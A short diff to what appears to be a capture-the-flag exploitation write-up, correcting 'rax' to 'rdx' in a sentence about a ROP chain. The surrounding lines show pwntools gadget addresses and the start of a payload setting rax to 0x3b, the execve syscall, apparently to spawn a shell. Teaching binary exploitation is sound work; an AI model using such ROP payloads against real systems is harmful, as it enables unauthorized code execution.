@@ -185,7 +185,7 @@ pop_rax = p64(0x000000000041c0c4)
 pop_rdx = p64(0x0000000000452856)
 syscall = p64(0x000000000047ba25)
 ```
-Setting rax, rsi, and rax to the desired values will be easy; just place the value on the stack and pop it into the register.
+Setting rax, rsi, and rdx to the desired values will be easy; just place the value on the stack and pop it into the register.
 ```python
 payload += pop_rax
 payload += p64(0x3b)
